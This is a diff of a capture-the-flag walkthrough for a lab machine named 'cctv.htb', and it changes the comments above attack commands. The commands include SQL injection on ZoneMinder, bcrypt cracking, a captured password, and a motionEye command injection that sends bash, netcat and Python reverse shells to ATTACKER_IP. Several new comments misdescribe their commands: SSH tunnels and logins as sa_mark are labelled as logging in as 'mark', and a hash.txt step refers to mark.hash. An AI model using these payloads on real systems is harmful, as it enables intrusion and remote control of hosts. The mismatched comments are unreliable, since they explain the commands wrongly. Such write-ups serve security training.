@@ -57,8 +57,8 @@ echo "TARGET_IP cctv.htb" | sudo tee -a /etc/hosts
 
 ### Nmap Scan
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: perform a comprehensive port scan using Nmap.
+# Why here: map the attack surface and identify open services like SSH and Apache that could lead to initial access.
 nmap -sC -sV -p- TARGET_IP
 ```
 
@@ -75,8 +75,8 @@ Accessing `http://cctv.htb` reveals a web application. Further enumeration disco
 
 ```bash
 # Check for ZoneMinder
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: probe the /zm/ directory for a ZoneMinder installation.
+# Why here: confirm the presence of the surveillance platform and identify its version for potential vulnerability research.
 curl -s http://cctv.htb/zm/ | head -20
 ```
 
@@ -142,15 +142,15 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 
 Save the `mark` hash to a file:
 ```bash
-# What it does: guarda material de hash en un archivo de cracking.
-# Why here: prepare the input that john/hashcat expect.
+# What it does: store the bcrypt hash for the user 'mark'.
+# Why here: prepare the hash for offline cracking to recover the plaintext password.
 echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
 ```
 
 **Crack with John the Ripper:**
 ```bash
-# What it does: crackea el hash indicado con la wordlist elegida.
-# Why here: recover reusable credentials.
+# What it does: crack the mark.hash file using the rockyou wordlist.
+# Why here: recover the user's plaintext password for SSH access.
 john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -159,8 +159,8 @@ john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ### Step 4 — SSH Access
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in to the target via SSH as 'mark'.
+# Why here: obtain an interactive shell on the host system to begin local enumeration.
 ssh mark@TARGET_IP
 # Password: opensesame
 ```
@@ -189,8 +189,8 @@ id
 # uid=1001(mark) gid=1001(mark) groups=1001(mark)
 
 # Check sudo permissions
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: check for sudo privileges granted to 'mark'.
+# Why here: identify potential misconfigurations or SUID-like permissions that allow execution as root.
 sudo -l
 # No sudo access for mark
 
@@ -201,8 +201,8 @@ ps aux
 ss -tlnp
 
 # Search for interesting files
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for configuration, initialization, and markup files.
+# Why here: find sensitive files like motion.conf that might contain service credentials or lateral movement hints.
 find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | grep -v proc
 ```
 
@@ -210,8 +210,8 @@ find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | gr
 
 ```bash
 # Check for motionEye configuration
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the motionEye configuration file.
+# Why here: extract administrative credentials and service parameters for the motionEye frontend.
 cat /etc/motioneye/motion.conf
 ```
 
@@ -231,11 +231,11 @@ cat /etc/motioneye/motion.conf
 ```bash
 # Check cron jobs
 crontab -l
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: inspect the system-wide crontab file.
+# Why here: identify scheduled tasks running as root that might be vulnerable to command injection or file manipulation.
 cat /etc/crontab
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: list the contents of the system cron directory.
+# Why here: identify modular cron jobs and automation scripts that could facilitate privilege escalation.
 ls -la /etc/cron.d/
 ```
 
@@ -267,8 +267,8 @@ A cron job or scheduled task transmits credentials over the network. We can capt
 ### SSH as sa_mark
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in to the target via SSH as 'mark'.
+# Why here: obtain an interactive shell on the host system to begin local enumeration.
 ssh sa_mark@TARGET_IP
 # Password: <captured_password>
 ```
@@ -306,8 +306,8 @@ The vulnerability operates through a **three-stage failure**:
 motionEye listens on `127.0.0.1:7999` — not accessible externally. Create an SSH tunnel:
 
 ```bash
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in to the target via SSH as 'mark'.
+# Why here: obtain an interactive shell on the host system to begin local enumeration.
 ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
 ```
 
@@ -327,8 +327,8 @@ configUiValid = function() { return true; };
 
 ```bash
 # Enable picture output via API
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: enable picture capture in the motionEye configuration via the API.
+# Why here: prepare the system to trigger the command injection payload when a motion event is detected.
 curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
 ```
 
@@ -338,15 +338,15 @@ The `picture_filename` parameter is vulnerable to command injection. Inject a re
 
 **1. Set up listener:**
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a netcat listener on port 4444.
+# Why here: capture the incoming reverse shell connection from the root-level motion daemon.
 nc -lvnp 4444
 ```
 
 **2. Craft and send the payload (URL-encoded):**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: inject a bash reverse shell payload into the picture_filename parameter.
+# Why here: exploit CVE-2025-60787 to gain code execution when the motion daemon attempts to save a picture.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
 ```
 
@@ -357,8 +357,8 @@ curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >&
 
 **Alternative — URL-encoded version:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send a URL-encoded reverse shell payload to the motionEye API.
+# Why here: ensure the payload is correctly parsed by the web server to trigger the command injection.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
 ```
 
@@ -368,8 +368,8 @@ The payload executes when motion detection triggers a picture capture:
 
 ```bash
 # Enable motion emulation to trigger the capture
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: force a motion detection event via the API.
+# Why here: trigger the immediate execution of the injected command in picture_filename to receive the reverse shell.
 curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 ```
 
@@ -416,8 +416,8 @@ fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_I
 If filesystem access is available:
 ```bash
 # Edit motionEye camera config directly
-# What it does: imprime o escribe texto controlado.
-# Why here: crear la entrada o archivo pequeno necesario para el siguiente paso.
+# What it does: append the malicious payload directly to the camera configuration file.
+# Why here: perform a manual injection of the RCE payload if API access is restricted but filesystem write is available.
 echo "picture_filename $(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')" >> /etc/motioneye/camera-0.conf
 
 # Restart motion to trigger execution
@@ -477,18 +477,18 @@ sqlmap -u "http://TARGET/zm/index.php?view=request&request=event&action=removeta
 
 ```bash
 # Save hash to file
-# What it does: guarda material de hash en un archivo de cracking.
-# Why here: prepare the input that john/hashcat expect.
+# What it does: store the bcrypt hash for the user 'mark'.
+# Why here: prepare the hash for offline cracking to recover the plaintext password.
 echo '$2y$10$HASH_VALUE' > hash.txt
 
 # Crack with John
-# What it does: crackea el hash indicado con la wordlist elegida.
-# Why here: recover reusable credentials.
+# What it does: crack the mark.hash file using the rockyou wordlist.
+# Why here: recover the user's plaintext password for SSH access.
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 # Crack with Hashcat (bcrypt mode 3200)
-# What it does: cracks hashes with the specified mode and wordlist.
-# Why here: recuperar credenciales o confirmar que no estan en la lista.
+# What it does: use Hashcat to crack the bcrypt hash with GPU acceleration.
+# Why here: speed up the cracking process for complex passwords not easily recovered by CPU-based tools.
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -500,13 +500,13 @@ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 
 ```bash
 # SSH tunnel to motionEye
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in to the target via SSH as 'mark'.
+# Why here: obtain an interactive shell on the host system to begin local enumeration.
 ssh -L 8765:127.0.0.1:7999 USER@TARGET
 
 # Enable picture output
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: enable picture capture via the motionEye API.
+# Why here: fulfill the prerequisite for the command injection vulnerability in picture_filename.
 curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
 
 # Inject reverse shell (picture_filename parameter)
@@ -520,15 +520,15 @@ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 
 **Netcat reverse shell:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: inject a netcat-based reverse shell payload.
+# Why here: provide an alternative RCE payload for environments where bash -i is restricted or not available.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(nc -e /bin/bash ATTACKER_IP PORT)"
 ```
 
 **Python reverse shell:**
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: inject a Python-based reverse shell payload.
+# Why here: provide a reliable reverse shell option for systems with Python 3 installed and restricted shell environments.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])')"
 ```
 
@@ -597,8 +597,8 @@ sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
 
 ```bash
 # Get current configuration
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: retrieve the current camera configuration from the motionEye API.
+# Why here: verify existing settings and identify parameters that can be manipulated for exploitation.
 curl "http://127.0.0.1:7999/1/config/get"
 
 # Set configuration value
